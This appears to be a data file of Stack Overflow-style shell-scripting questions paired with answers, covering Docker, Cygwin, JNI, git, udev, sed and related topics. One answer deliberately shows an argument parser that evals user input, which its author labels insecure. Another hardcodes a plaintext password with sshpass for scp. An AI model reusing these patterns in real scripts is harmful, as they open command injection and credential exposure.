    "Unable to run cygwin in Windows Docker Container": "You don't \"attach\" to a container with docker run: you start a container with it.\nIn your case, as seen here, docker run -it is the right approach.\nYou can try as an entry point using c:\\cygwin\\bin\\bash, as seen in this issue.\nAs commented in issue 32330:\nDon't get me wrong, cygwin should work in Docker Windows containers.\nBut, it's also a little paradoxical that containers were painstakingly wrought into Windows, modeled on containers on Linux, only for people to then want to run Linux-utils in these newly minted Docker Windows containers...\nThat same issue is still unresolved, with new case seen in May and June 2018:\nWe have an environment that compiles with Visual Studio but still we want to use git and some very useful commands taken from linux.\nAlso we use of-the-shelve utilities (e.g. git-repo) that uses linux commands (e.g. curl, grep,...)\nSome builds require Cygwin like ICU (a cross-platform Unicode based globalization library), and worst: our builds require building it from source.\nYou can see an example of a crash in MSYS2-packages issue 1239:\nStep 5/5 : RUN \"C:\\\\msys64\\\\usr\\\\bin\\\\ls.exe\"\n ---> Running in 5d7867a1f8da\nThe command 'cmd /S /C \"C:\\\\msys64\\\\usr\\\\bin\\\\ls.exe\"' returned a non-zero code: 3221225794\nThis can get more information on the crash:\nPS C:\\msys64\\usr\\bin> \n  Get-EventLog -Index 28,29,30 -LogName \"Application\" | Format-List -Property *\nThe workaround was:\nPS > xcopy /S C:\\Git C:\\Git_Copy\nPS > C:\\Git_Copy\\usr\\bin\\sh.exe --version > v.txt\nPS > type v.txt\nAs mentioned in that thread, the output gets lost somewhere in the container, thus sending it to a text file.",
    "Effects of comment (#) lines before and/or after the comment-like #!/bin/sh line": "Normally a shell script is run by your default shell defined in the /etc/passwd file. But you can define explicitly a program which can run your script.\nUnices uses a common method to determine what program needed to run a specific script (man execve(2)). If the script has the proper execute rights set and in a script the first line starts with a #! characters, it will run by the program defined afterwards.\nFor example if the first line is #!/usr/bin/awk -f then the rest of the file will be passed to the awk program (so it has to use awk syntax). Or if a Makefile starts with #!/usr/bin/make -f then the rest of the file will be passed to make. You can start the script as a normal program and the script can be written in awk or make (or whatever defined) syntax.\nIf execve does not find #! as the first two character of the file, it will consider as a normal script file and it will run as it is.\nSo using #! You can determine the script language and You do not need to know what shell is used by the other user using your script. In any other line #! will be interpretered your default shell, which is usually just a comment line.",
    "Run a script after maven install": "Use the http://www.mojohaus.org/exec-maven-plugin/ exec-maven-plugin, in conjunction with an \"executions\" configuration block that specifies the installation phase. Make sure it is after your maven-install-plugin as plugins are ran in order (within the same phase)\n(in build/plugins)  \n  <plugin>\n    <groupId>org.apache.maven.plugins</groupId>\n    <artifactId>maven-install-plugin</artifactId>\n    <version>2.5.2</version>\n  </plugin>\n  <plugin>\n    <groupId>org.codehaus.mojo</groupId>\n    <artifactId>exec-maven-plugin</artifactId>\n    <version>1.5.0</version>\n    <executions>\n      <execution>\n        <phase>install</phase>\n        <goals>\n           <goal>exec</goal>\n        </goals>\n        <configuration>\n          <executable>do-something.sh</executable>\n          <workingDirectory>/some/dir</workingDirectory>\n          <arguments>\n             <argument>--debug</argument>\n             <argument>with_great_effect</argument>\n          </arguments>\n        </configuration>\n      </execution>\n    </executions>\n  </plugin>",
    "sending password to command line tools": "If the application has some interactive mode, you can use something like pyexpect.\nIf it only accepts passwords on command line the application was DESIGNED to be vulnerable to 'ps ax', how are you expected to overcome original bad design? It is propietary, complaints should go to the guilty^H^H^H^H^H^Hauthor.",
    "How can I make a Hashmap in Linux shell? [duplicate]": "The environment itself is a hash map that associates string keys with string values.\nmyvar1=myvalue1\nmyvar2=myvalue2\netc.\nOr do you need something more?",
    "Is bash doing \"$@\" expansion incorrectly inside ${var+...}?": "I tend not to trust spaces inside unquoted parameter expansion. I can't explain why it doesn't work, but I can give you a solution that does: move the space outside the parameter expansion. The set command doesn't mind trailing white space.\n$ bash -c 'set bar; set foo ${1+\"$@\"}; echo \"$# $*\"'   # 5.0.2(1)\n2 foo bar\n\n$ dash -c 'set bar; set foo ${1+\"$@\"}; echo \"$# $*\"'   # 0.5.10.2\n2 foo bar\n\n$ ash  -c 'set bar; set foo ${1+\"$@\"}; echo \"$# $*\"'   # /bin/sh on FreeBSD 7.3\n2 foo bar\n\n$ ksh  -c 'set bar; set foo ${1+\"$@\"}; echo \"$# $*\"'   # 93u+ 2012-08-01\n2 foo bar\n\n$ zsh  -c 'set bar; set foo ${1+\"$@\"}; echo \"$# $*\"'   # 5.7\n2 foo bar\n(I ran everything on the latest Debian Testing except ash)",
    "Determining whether a Java program has been launched from an interactive shell": "There is a conversation where Cygwin's maintainer (Corinna Vinschen) explains that the Cygwin pseudo TTYs look like pipes to the Microsoft Visual C run-time library (MSVCRT). She also suggests to implement a wrapper around the isatty() function that recognizes Cygwin pseudo TTYs.\nThe idea is to fetch the name of the pipe associated with given file descriptor. The NtQueryInformationFile function fetches FILE_NAME_INFORMATION structure, where FileName member contains the pipe name. If the pipe name matches the following pattern, then it is very likely that the command is running in interactive mode:\n\\cygwin-%16llx-pty%d-{to,from}-master\nThe conversation is pretty old, but the format of pipe names is still the same: \"\\\\\\\\.\\\\pipe\\\\cygwin-\" + \"%S-\" + + \"pty%d-from-master\", where \"\\\\\\\\.\\\\pipe\\\\\" is a convensional prefix for named pipes (see CreateNamedPipe).\nSo the Cygwin part is already hacked. The next step is to make a Java function from the C code.\nExample\nThe following creates ttyjni.TestApp class with istty() method implemented via the Java Native Interface (JNI). The code is tested on GNU/Linux (x86_64) and Cygwin on Windows 7 (64-bit). The code can be easily ported to Windows (cmd.exe), maybe even works as is.\nRequired components\nCygwin with x86_64-w64-mingw32-gcc compiler\nWindows with JDK\nLayout\n\u251c\u2500\u2500 Makefile\n\u251c\u2500\u2500 TestApp.c\n\u251c\u2500\u2500 test.sh\n\u251c\u2500\u2500 ttyjni\n\u2502   \u2514\u2500\u2500 TestApp.java\n\u2514\u2500\u2500 ttyjni_TestApp.h\nMakefile\n# Input: $JAVA_HOME\n\nFINAL_TARGETS := TestApp.class\n\nifeq ($(OS),Windows_NT)\n  CC=x86_64-w64-mingw32-gcc\n  FINAL_TARGETS += testapp.dll\nelse\n  CC=gcc\n  FINAL_TARGETS += libtestapp.so\nendif\n\nall: $(FINAL_TARGETS)\n\nTestApp.class: ttyjni/TestApp.java\n  javac $<\n\ntestapp.dll: TestApp.c TestApp.class\n  $(CC) \\\n    -Wl,--add-stdcall-alias \\\n    -D__int64=\"long long\" \\\n    -D_isatty=isatty -D_fileno=fileno \\\n    -I\"$(JAVA_HOME)/include\" \\\n    -I\"$(JAVA_HOME)/include/win32\" \\\n    -shared -o $@ $<\n\nlibtestapp.so: TestApp.c\n  $(CC) \\\n    -I\"$(JAVA_HOME)/include\" \\\n    -I\"$(JAVA_HOME)/include/linux\" \\\n    -fPIC \\\n    -o $@ -shared -Wl,-soname,testapp.so $<  \\\n    -z noexecstack\n\nclean:\n  rm -f *.o $(FINAL_TARGETS) ttyjni/*.class\nTestApp.c\n#include <jni.h>\n#include <stdio.h>\n#include \"ttyjni_TestApp.h\"\n\n#if defined __CYGWIN__ || defined __MINGW32__ || defined __MINGW64__\n#include <io.h>\n#include <errno.h>\n#include <wchar.h>\n#include <windows.h>\n#include <winternl.h>\n#include <unistd.h>\n\n\n/* vvvvvvvvvv From http://cygwin.com/ml/cygwin/2012-11/txt00003.txt vvvvvvvv */\n\n#ifndef __MINGW64_VERSION_MAJOR\n/* MS winternl.h defines FILE_INFORMATION_CLASS, but with only a\n   different single member. */\nenum FILE_INFORMATION_CLASSX\n{\n  FileNameInformation = 9\n};\n\ntypedef struct _FILE_NAME_INFORMATION\n{\n  ULONG FileNameLength;\n  WCHAR FileName[1];\n} FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;\n\nNTSTATUS (NTAPI *pNtQueryInformationFile) (HANDLE, PIO_STATUS_BLOCK, PVOID,\n    ULONG, FILE_INFORMATION_CLASSX);\n#else\nNTSTATUS (NTAPI *pNtQueryInformationFile) (HANDLE, PIO_STATUS_BLOCK, PVOID,\n    ULONG, FILE_INFORMATION_CLASS);\n#endif\n\njint\ntestapp_isatty(jint fd)\n{\n  HANDLE fh;\n  NTSTATUS status;\n  IO_STATUS_BLOCK io;\n  long buf[66]; /* NAME_MAX + 1 + sizeof ULONG */\n  PFILE_NAME_INFORMATION pfni = (PFILE_NAME_INFORMATION) buf;\n  PWCHAR cp;\n\n\n  /* First check using _isatty.\n\n     Note that this returns the wrong result for NUL, for instance!\n     Workaround is not to use _isatty at all, but rather GetFileType\n     plus object name checking. */\n  if (_isatty(fd))\n    return 1;\n\n  /* Now fetch the underlying HANDLE. */\n  fh = (HANDLE)_get_osfhandle(fd);\n  if (!fh || fh == INVALID_HANDLE_VALUE) {\n    errno = EBADF;\n    return 0;\n  }\n\n  /* Must be a pipe. */\n  if (GetFileType (fh) != FILE_TYPE_PIPE)\n    goto no_tty;\n\n  /* Calling the native NT function NtQueryInformationFile is required to\n     support pre-Vista systems.  If that's of no concern, Vista introduced\n     the GetFileInformationByHandleEx call with the FileNameInfo info class,\n     which can be used instead. */\n  if (!pNtQueryInformationFile) {\n    pNtQueryInformationFile = (NTSTATUS (NTAPI *)(HANDLE, PIO_STATUS_BLOCK,\n          PVOID, ULONG, FILE_INFORMATION_CLASS))\n      GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtQueryInformationFile\");\n    if (!pNtQueryInformationFile)\n      goto no_tty;\n  }\n  if (!NT_SUCCESS (pNtQueryInformationFile (fh, &io, pfni, sizeof buf,\n          FileNameInformation)))\n    goto no_tty;\n\n  /* The filename is not guaranteed to be NUL-terminated. */\n  pfni->FileName[pfni->FileNameLength / sizeof (WCHAR)] = L'\\0';\n\n  /* Now check the name pattern.  The filename of a Cygwin pseudo tty pipe\n     looks like this:\n\n     \\cygwin-%16llx-pty%d-{to,from}-master\n\n     %16llx is the hash of the Cygwin installation, (to support multiple\n     parallel installations), %d id the pseudo tty number, \"to\" or \"from\"\n     differs the pipe direction. \"from\" is a stdin, \"to\" a stdout-like\n     pipe. */\n  cp = pfni->FileName;\n  if (!wcsncmp(cp, L\"\\\\cygwin-\", 8)\n      && !wcsncmp (cp + 24, L\"-pty\", 4))\n  {\n    cp = wcschr(cp + 28, '-');\n    if (!cp)\n      goto no_tty;\n    if (!wcscmp (cp, L\"-from-master\") || !wcscmp (cp, L\"-to-master\"))\n      return 1;\n  }\nno_tty:\n  errno = EINVAL;\n  return 0;\n}\n\n/* ^^^^^^^^^^ From http://cygwin.com/ml/cygwin/2012-11/txt00003.txt ^^^^^^^^ */\n\n#elif _WIN32\n#include <io.h>\n\nstatic jint\ntestapp_isatty(jint fd)\n{\n  return _isatty(fd);\n}\n#elif defined __linux__ || defined __sun || defined __FreeBSD__\n#include <unistd.h>\n\nstatic jint\ntestapp_isatty(jint fd)\n{\n  return isatty(fd);\n}\n#else\n#error Unsupported platform\n#endif /* __CYGWIN__ */\n\nJNIEXPORT jboolean JNICALL Java_ttyjni_TestApp_istty\n(JNIEnv *env, jobject obj)\n{\n  return testapp_isatty(fileno(stdin)) &&\n    testapp_isatty(fileno(stdout)) ?\n    JNI_TRUE : JNI_FALSE;\n}\nttyjni_TestApp.h\n/* DO NOT EDIT THIS FILE - it is machine generated */\n#include <jni.h>\n/* Header for class ttyjni_TestApp */\n\n#ifndef _Included_ttyjni_TestApp\n#define _Included_ttyjni_TestApp\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n/*\n * Class:     ttyjni_TestApp\n * Method:    istty\n * Signature: ()Z\n */\nJNIEXPORT jboolean JNICALL Java_ttyjni_TestApp_istty\n  (JNIEnv *, jobject);\n\n#ifdef __cplusplus\n}\n#endif\n#endif\nttyjni/TestApp.java\npackage ttyjni;\n\nimport java.io.Console;\nimport java.lang.reflect.Method;\n\nclass TestApp {\n    static {\n        System.loadLibrary(\"testapp\");\n    }\n    private native boolean istty();\n\n    private static final String ISTTY_METHOD = \"istty\";\n    private static final String INTERACTIVE = \"interactive\";\n    private static final String NON_INTERACTIVE = \"non-interactive\";\n\n    protected static boolean isInteractive() {\n        try {\n            Method method = Console.class.getDeclaredMethod(ISTTY_METHOD);\n            method.setAccessible(true);\n            return (Boolean) method.invoke(Console.class);\n        } catch (Exception e) {\n            System.out.println(e.toString());\n        }\n\n        return false;\n    }\n\n    public static void main(String[] args) {\n        // Testing JNI\n        TestApp t = new TestApp();\n        boolean b = t.istty();\n        System.out.format(\"%s(jni)\\n\", b ?\n                \"interactive\" : \"non-interactive\");\n\n        // Testing pure Java\n        System.out.format(\"%s(console)\\n\", System.console() != null ?\n                INTERACTIVE : NON_INTERACTIVE);\n        System.out.format(\"%s(java)\\n\", isInteractive() ?\n                INTERACTIVE : NON_INTERACTIVE);\n    }\n}\ntest.sh\n#!/bin/bash -\njava -Djava.library.path=\"$(dirname \"$0\")\" ttyjni.TestApp\nCompiling\nmake\nTesting on Linux\n$ ./test.sh\ninteractive(jni)\ninteractive(console)\ninteractive(java)\n\n$ ./test.sh > 1\nruslan@pavilion ~/tmp/java $ cat 1\nnon-interactive(jni)\nnon-interactive(console)\nnon-interactive(java)\nTesting on Cygwin\n$ ./test.sh\ninteractive(jni)\nnon-interactive(console)\nnon-interactive(java)\n\n$ ./test.sh > 1\n$ cat 1\nnon-interactive(jni)\nnon-interactive(console)\nnon-interactive(java)",
    "mklink permission on windows 8": "You can create symbolic links in non-elevated command prompt ONLY if you have enabled SeCreateSymbolicLink policy for user AND user doesn't belong to Administrators group",
    "Convert bash function to fish's [closed]": "Some notes on the differences:\nsetting variables\nbash: var=value\nfish: set var value\nfunctions\nbash\nfuncName() {\n    ...\n}\nfish\nfunction funcName\n    ...\nend\nfunction arguments\nbash: \"$@\", \"$1\", \"$2\", ...\nfish: $argv, $argv[1], $argv[2], ...\nfunction local variables\nbash: local var\nfish: set -l var\nconditionals I\nbash: [[ ... ]] and test ... and [ ... ]\nfish: test ... and [ ... ], no [[ ... ]]\nconditionals II\nbash: if cond; then cmds; fi\nfish: if cond; cmds; end\nconditionals III\nbash: cmd1 && cmd2\nfish: cmd1; and cmd2\nfish (as of fish 3.0): cmd1 && cmd2\ncommand substitution\nbash: output=$(pipeline)\nfish: set output (pipeline)\nprocess substitution\nbash: join <(sort file1) <(sort file2)\nfish: join (sort file1 | psub) (sort file2 | psub)\nDocumentation\nbash: https://www.gnu.org/software/bash/manual/bashref.html\nfish: http://fishshell.com/docs/current/index.html and https://fishshell.com/docs/current/fish_for_bash_users.html",
    "get available memory in gb using single bash shell command": "Just a slight modification to your own magical incantation:\nawk '/MemFree/ { printf \"%.3f \\n\", $2/1024/1024 }' /proc/meminfo\nP.S.: Dear OP, if you find yourself invoking grep & awk in one line you're most likely doing it wrong ;} ... Same with invoking cat on a single file; that's hardly ever warranted.",
    "What's the best practice for changing working directories inside scripts?": "Like Hugo said, you can't effect your parent process's cwd so there's no problem.\nWhere the question is more applicable is if you don't control the whole process, like in a subroutine or module. In those cases you want to exit the subroutine in the same directory as you entered, otherwise subtle action-at-a-distance creeps in which causes bugs.\nYou can to this by hand...\nuse Cwd;\nsub foo {\n    my $orig_cwd = cwd;\n    chdir \"some/dir\";\n\n    ...do some work...\n\n    chdir $orig_cwd;\n}\nbut that has problems. If the subroutine returns early or dies (and the exception is trapped) your code will still be in some/dir. Also, the chdirs might fail and you have to remember to check each use. Bleh.\nFortunately, there's a couple modules to make this easier. File::pushd is one, but I prefer File::chdir.\nuse File::chdir;\nsub foo {\n    local $CWD = 'some/dir';\n\n    ...do some work...\n}\nFile::chdir makes changing directories into assigning to $CWD. And you can localize $CWD so it will reset at the end of your scope, no matter what. It also automatically checks if the chdir succeeds and throws an exception otherwise. Sometimes it use it in scripts because it's just so convenient.",
    "How to build an executable for Android shell": "",
    "Simple method to shuffle the elements of an array in BASH shell?": "The accepted answer doesn't match the headline question too well, though the details in the question are a bit ambiguous. The question asks about how to shuffle elements of an array in BASH, and kurumi's answer shows a way to manipulate the contents of a string.\nkurumi nonetheless makes good use of the 'shuf' command, while siegeX shows how to work with an array.\nPutting the two together yields an actual \"simple method to shuffle the elements of an array in BASH shell\":\n$ myarray=( 'a;' 'b;' 'c;' 'd;' 'e;' 'f;' )\n$ myarray=( $(shuf -e \"${myarray[@]}\") )\n$ printf \"%s\" \"${myarray[@]}\"\nd;b;e;a;c;f;",
    "How to get dd to print transfer stats in MacOS?": "You can also press Ctrl+T in the Terminal tab to get the same behavior:\nMacBook-Pro:~ $ dd if=~/source_image.dmg of=/dev/disk1\nload: 0.87  cmd: dd 7229 uninterruptible 0.21u 3.91s\n265809+0 records in\n265808+0 records out\n136093696 bytes transferred in 131.170628 secs (1037532 bytes/sec)\nload: 0.99  cmd: dd 7229 uninterruptible 0.32u 5.89s\n415769+0 records in\n415768+0 records out\n212873216 bytes transferred in 203.357068 secs (1046795 bytes/sec)",
    "find does not find recursively [closed]": "When using a wildcard in an argument it is expanded by the shell. To prevent this, you need to write \"*.mov\".\nIn your case, the shell expands to whatever files it finds before passing the argument to find, which then gets a list of files and will not search based on the original pattern.",
    "How to swap parameters in shell command": "Yes you can use history substitution:\n$ echo foo bar\nfoo bar\n$ !:0 !:2 !:1          # previous command with second arg then first arg\necho bar foo\nbar foo\n$ ",
    "Calling a python script from command line without typing \"python\" first": "You can prepend a shebang on the first line of the script:\n#!/usr/bin/env python\nThis will tell your current shell which command to feed the script into.",
    "when i update oh-my-zsh i got a error.how do i fix it?": "Try to change .oh-my-zsh/ permissions:\n\u279c sudo chmod -R 755 ~/.oh-my-zsh\nIf it doesn't help, try:\n\u279c chmod 755 /usr/local/share/zsh\n\u279c chmod 755 /usr/local/share/zsh/site-functions",
    "Shell script: Ensure that script isn't executed if already running [duplicate]": "A solution without race condition or early exit problems is to use a lock file. The flock utility handles this very well and can be used like this:\nflock -n /var/run/your.lockfile -c /your/script\nIt will return immediately with a non 0 status if the script is already running.",
    "How to test wifi connection via adb?": "",
    "How sort find result by file sizes": "Here is how to do using find command:\nfind . -type f -exec ls -al {} \\; | sort -k 5 -n | sed 's/ \\+/\\t/g' | cut -f 9\nHere is how to do using recursive ls command:\nls -lSR | sort -k 5 -n\nOr, if you want to display only file names:\nls -lSR | sort -k 5 -n | sed 's/ \\+/\\t/g' | cut -f 9",
    "Bash Script Regular Expressions...How to find and replace all matches?": "Try this using sed:\nline='Today is 10/12/2010 and yesterday was 9/11/2010'\necho \"$line\" | sed -r 's#([0-9]{1,2})/([0-9]{1,2})/([0-9]{4})#\\3-\\2-\\1#g'\n\nOUTPUT:\nToday is 2010-12-10 and yesterday was 2010-11-9\nPS: On mac use sed -E instead of sed -r",
    "How to untar all .tar.gz with shell-script?": "for f in *.tar.gz\ndo\n  tar zxvf \"$f\" -C /path/tar\ndone",
    "How to replace Unicode characters with ASCII": "It is possible to use hex values in \"sed\".\necho \"\u00c3\" | hexdump -C\n00000000  c3 83 0a                                          |...|\n00000003\nOk, that character is two byte combination \"c3 83\". Let's replace it with single byte \"A\":\necho \"\u00c3\" |sed 's/\\xc3\\x83/A/g'\nA\nExplanation: \\x indicates for \"sed\" that a hex code follows.",
    "How to get extension of a file in shell script": "to get file extension, just use the shell\n$ filename=\"myfile.ext\"\n$ echo ${filename##*.}\next\n$ file_ext=${filename##*.} #put to variable\n$ echo ${file_ext}\next",
    "Find highest numbered filename in a directory where names start with digits": "Do you need the whole LIST?\nIf not\nLAST=`exec ls $MY_DIR | sed 's/\\([0-9]\\+\\).*/\\1/g' | sort -n | tail -1`\nwill give you just the 005 part and\nprintf \"%03d\" `expr 1 + $LAST`\nwill print the next number in the sequence.",
    "Script to install app in iOS Simulator": "As of Xcode 6, you should be able to use simctl to accomplish this.\n1) Get the list of available devices:\nxcrun simctl list devices\n1a) Assuming you have jq installed, you can use it to get only those devices that are actually available:\nxcrun simctl list devices -j \\\n| jq -rc '.[] | .[] | .[] | select( .availability | contains( \"(available)\" ) ) '\n1b) Or even filter further by iPhone or iPad:\nxcrun simctl list devices -j \\\n| jq -rc '.[] | .[] | .[] | select( .name | contains( \"iPhone\" ), contains( \"iPad\" ) ) | select( .availability | contains( \"(available)\" ) ) '\n2) Once you have the UDID of the device you want to install to:\nxcrun simctl install $DEVICE_UDID /path/to/your/app\n2a) Or, if you want to just install to the booted device:\nxcrun simctl install booted /path/to/your/app\nWhere this gets really handy is if you want to run the same app on all the devices:\n1) Reset / erase all simulators:\nxcrun simctl erase all\n2) Open one Simulator instance for each test:\nopen -n /Applications/Xcode.app/Contents/Developer/Applications/Simulator.app\n(Ignore the 'Booted' error and switch hardware.)\n3) Get UDIDs of available devices we want to install to:\nDEVICES=$( xcrun simctl list devices -j | jq -rc '.[] | .[] | .[] | select( .name | contains( \"iPhone\" ), contains( \"iPad\" ) ) | select( .availability | contains( \"(available)\" ) ) | select( .state == \"Booted\" ) | .udid ' )\n4) Install the app (which must be built for the appropriate simulator SDK):\nfor device in DEVICES ; do xcrun simctl install $device /path/to/app ; done\n5) For convenience, launch the app on each device:\nfor device in $DEVICES ; do xcrun simctl launch $device your.product.app.id ; done",
    "How to create a function in shell script that receives parameters?": "function display_value() {\n    echo \"The value is $1\"\n}\n\namount=1\ndisplay_value $amount\namount=2\ndisplay_value $amount",
    "Parsing shell script arguments": "There are lots of ways to parse arguments in sh. Getopt is good. Here's a simple script that parses things by hand:\n#!/bin/sh\n# WARNING: see discussion and caveats below\n# this is extremely fragile and insecure\n\nwhile echo $1 | grep -q ^-; do\n    # Evaluating a user entered string!\n    # Red flags!!!  Don't do this\n    eval $( echo $1 | sed 's/^-//' )=$2\n    shift\n    shift\ndone\n\necho host = $host\necho user = $user\necho pass = $pass\necho args = $@\nA sample run looks like:\n$ ./a.sh -host foo -user me -pass secret some args\nhost = foo\nuser = me\npass = secret\nargs = some args\nNote that this is not even remotely robust and massively open to security holes since the script eval's a string constructed by the user. It is merely meant to serve as an example for one possible way to do things. A simpler method is to require the user to pass the data in the environment. In a bourne shell (ie, anything that is not in the csh family):\n$ host=blah user=blah pass=blah myscript.sh\nworks nicely, and the variables $host, $user, $pass will be available in the script.\n#!/bin/sh\necho host = ${host:?host empty or unset}\necho user = ${user?user not set}\n...",
    "syntax error near unexpected token `<'": "You get the error because process substitution (the <(some command) part) is not a standard feature (defined in POSIX) in sh, which means it may work on some OS but may not in others or in the same OS with different configuration.\nYou clarified that you have #!/bin/bash at the top of your script, but I guess you still run the script via sh foo.sh, as such, #!/bin/bash will be ignored and the script is interpreted by sh.\nI assume your default shell is bash (run echo $SHELL), so all problems are gone if you paste the script in terminal and execute.\n==== UPDATE ====\nPossible solution if my assumption is correct:\nLeave #!/bin/bash as it is, make your script an executable by chmod +x foo.sh. Then run it directly by ./foo.sh",
    "SUID not working with shell script": "Shell scripts can't be SUID. See http://www.faqs.org/faqs/unix-faq/faq/part4/section-7.html",
    "How to print out to the same line, overriding previous line?": "Use the special character \\r. It returns to the beginning of the line without going to the next one.\nfor i in {1..10} ; do\n    echo -n '['\n    for ((j=0; j<i; j++)) ; do echo -n ' '; done\n    echo -n '=>'\n    for ((j=i; j<10; j++)) ; do echo -n ' '; done\n    echo -n \"] $i\"0% $'\\r'\n    sleep 1\ndone",
    "Linux: Removing files that don't contain all the words specified": "How about:\ngrep -L foo *.txt | xargs rm\ngrep -L bar *.txt | xargs rm\nIf a file does not contain foo, then the first line will remove it.\nIf a file does not contain bar, then the second line will remove it.\nOnly files containing both foo and bar should be left\n-L, --files-without-match\n     Suppress normal output; instead print the  name  of  each  input\n     file from which no output would normally have been printed.  The\n     scanning will stop on the first match.\nSee also @Mykola Golubyev's post for placing in a loop.",
    "How can I get a Python program to kill itself using a command run through the module sys?": "You can use sys.exit() to exit the program normally.\nExit the interpreter by raising SystemExit(status). If the status is omitted or None, it defaults to zero (i.e., success). If the status is an integer, it will be used as the system exit status. If it is another kind of object, it will be printed and the system exit status will be one (i.e., failure).\nThe system command to kill the interpreter itself depends on the shell used; if your shell is bash or zsh, you can use:\na@host:~$ python\nPython 2.7.8 (default, Oct 20 2014, 15:05:19) \n[GCC 4.9.1] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> import os\n>>> os.system('kill $PPID')\nTerminated\na@host:~$\nThough your actual results may vary. To be safer, you need to provide the process ID yourself:\n>>> os.system('kill %d' % os.getpid())\nIf you want to just a get signal sent to your process, you can also use os.kill() with the process id of your process; the process id of currently running process is available from os.getpid():\na@host:~$  python\nPython 2.7.8 (default, Oct 20 2014, 15:05:19) \n[GCC 4.9.1] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> import os\n>>> os.kill(os.getpid(), 9)\n[1]    27248 killed     python\na@host:~$ ",
    "Pass ATTR{idVendor} as argument in udev script": "Just to add on to this answer, udev also lets you pass arguments to RUN and PROGRAM.\nFrom the udev man page:\n   The NAME, SYMLINK, PROGRAM, OWNER, GROUP, MODE and RUN fields support simple\n   printf-like string substitutions. The RUN format chars gets applied after\n   all rules have been processed, right before the program is executed. It\n   allows the use of device properties set by earlier matching rules. For all\n   other fields, substitutions are applied while the individual rule is being\n   processed.\nFor example, you could have a rule like this:\n# Passes major, minor and serial number as parameters to script.\nACTION==\"add\", SUBSYSTEM==\"usb\", RUN+=\"/tmp/test.sh %M %m $attr{serial}\"\nThe available substitutions are:\n    $kernel, %k\n       The kernel name for this device.\n\n   $number, %n\n       The kernel number for this device. For example, \u00b4sda3\u00b4 has kernel number\n       of \u00b43\u00b4\n\n   $devpath, %p\n       The devpath of the device.\n\n   $id, %b\n       The name of the device matched while searching the devpath upwards for\n       SUBSYSTEMS, KERNELS, DRIVERS and ATTRS.\n\n   $driver\n       The driver name of the device matched while searching the devpath\n       upwards for SUBSYSTEMS, KERNELS, DRIVERS and ATTRS.\n\n   $attr{file}, %s{file}\n       The value of a sysfs attribute found at the device, where all keys of\n       the rule have matched. If the matching device does not have such an\n       attribute, follow the chain of parent devices and use the value of the\n       first attribute that matches. If the attribute is a symlink, the last\n       element of the symlink target is returned as the value.\n\n   $env{key}, %E{key}\n       A device property value.\n\n   $major, %M\n       The kernel major number for the device.\n\n   $minor, %m\n       The kernel minor number for the device.\n\n   $result, %c\n       The string returned by the external program requested with PROGRAM. A\n       single part of the string, separated by a space character may be\n       selected by specifying the part number as an attribute: %c{N}. If\n       the number is followed by the \u00b4+\u00b4 char this part plus all remaining\n       parts of the result string are substituted: %c{N+}\n\n   $parent, %P\n       The node name of the parent device.\n\n   $name\n       The current name of the device node. If not changed by a rule, it\n       is the name of the kernel device.\n\n   $links\n       The current list of symlinks, separated by a space character. The\n       value is only set if an earlier rule assigned a value, or during a\n       remove events.\n\n   $root, %r\n       The udev_root value.\n\n   $sys, %S\n       The sysfs mount point.\n\n   $tempnode, %N\n       The name of a created temporary device node to provide access to the\n       device from a external program before the real node is created.\n\n   %%\n       The \u00b4%\u00b4 character itself.\n\n   $$\n       The \u00b4$\u00b4 character itself.",
    "Syntax error in shell script with process substitution": "The syntax you've used is a bash extension to the basic shell syntax, so you must take care to run your script with bash. (Ksh also has >(\u2026) process substitution but doesn't support it after a redirection. Zsh would be fine.)\nGiven the error message you're getting, you are running this script in bash, but in its POSIX compatibility mode, not in full bash mode. Take care to invoke your script with an explicit #!/bin/bash line. #!/bin/sh won't do, even if /bin/sh is a symbolic link to bash, because bash runs in POSIX mode if it's invoked under the name sh. Always invoke bash by name if you use bash features.\nAlso take care not to set the environment variable POSIXLY_CORRECT or to pass the --posix option on the command line if you want to use bash features.\nAlternatively, don't use this bash-specific syntax; use a portable construct such as the one proposed by Stephane Rouberol.",
    "How to respond to password prompt when using SCP in a shell script?": "Use \"sshpass\"!\n#!/bin/bash\nsshpass -p \"password\" scp -r /some/local/path user@example.com:/some/remote/path",
    "NSTask not picking up $PATH from the user's environment": "Try,\n    [task setLaunchPath:@\"/bin/bash\"];\n    NSArray *args = [NSArray arrayWithObjects:@\"-l\",\n                     @\"-c\",\n                     @\"which git\",\n                     nil];\n    [task setArguments: args];\nThis worked for me on Snow Leopard; I haven't tested on any other system. The -l (lowercase L) tells bash to \"act as if it had been invoked as a login shell\", and in the process it picked up my normal $PATH. This did not work for me if the launch path was set to /bit/sh, even with -l.",
    "Is there a good Python GUI shell?": "One project I'm aware of that provides similar features (inline plotting, customisable rendering) is Reinteract. Another (though possibly a bit heavyweight for general usage) is SAGE which provides functionality for web-based notebooks.\nThese aren't quite shells - they're designed more as a mathematical notebook (so for instance, you can modify an earlier result and have the change propogate to later calculations), but they're close to what you're looking for, and could probably be modified to be used as such.",
    "Bash Shell Current Date Minus Number of Days": "Try\ndate -d '30 days ago'\nshould do on debian.",
    "What's the meaning of the operator || in linux shell?": "It's equivalent to boolean \"or\" with short-circuiting evaluation, such that it will execute the second command only if the first returns some value corresponding to \"false\". For example:\nfalse || echo \"foo\"\nechoes \"foo\", while\ntrue || echo \"foo\"\nPrints nothing. The && operator provides a complimentary operation.",
    "Sending simple message body + file attachment using Linux Mailx [duplicate]": "The usual way is to use uuencode for the attachments and echo for the body:\n(uuencode output.txt output.txt; echo \"Body of text\") | mailx -s 'Subject' user@domain.com\nFor Solaris and AIX, you may need to put the echo statement first:\n(echo \"Body of text\"; uuencode output.txt output.txt) | mailx -s 'Subject' user@domain.com",
    "Succinct way to create a tracking branch with Git": "git checkout -t -b whatever origin/whatever\nor short\ngit checkout -t origin/whatever\nSomething to read: http://git-scm.com/docs/git-checkout",
    "How to obtain container id base on docker image name via command line ?": "If you want to get the container id based on the image name this should work:\n$ docker ps | grep '<image_name>' | awk '{ print $1 }'\nOr even:\n$ docker ps | awk '/<image_name>/ { print $1 }'\nAs others have suggested you can also directly filter by the image name using the ancestor filter:\n$ docker ps -aqf \"ancestor=<image_name>\"\nThanks to @kevin-cui and @yu-chen.",
